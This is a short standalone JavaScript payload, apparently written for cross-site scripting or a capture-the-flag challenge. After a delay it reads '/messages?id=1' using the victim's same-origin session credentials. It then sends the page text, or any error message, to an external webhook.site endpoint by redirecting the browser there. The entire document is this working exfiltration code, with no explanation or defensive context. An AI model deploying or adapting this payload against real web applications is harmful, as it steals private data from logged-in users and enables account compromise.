(async function(){
  try {
    await new Promise(r => setTimeout(r, 1500));
    let resp = await fetch("/messages?id=1", {credentials: "same-origin"});
    let text;
    try {
      text = await resp.text();
    } catch (e) {
      text = "[fetch-error] " + e;
    }

    const exfil = "https://webhook.site/349c2f87-02ce-4457-a28a-6ebd01b87bfc/?d=" + encodeURIComponent(text);
    window.location.href = exfil;

  } catch (err) {    try {
      window.location.href = "https://webhook.site/349c2f87-02ce-4457-a28a-6ebd01b87bfc?err=" + encodeURIComponent(err.message);
    } catch (e) {  }
  }
})();
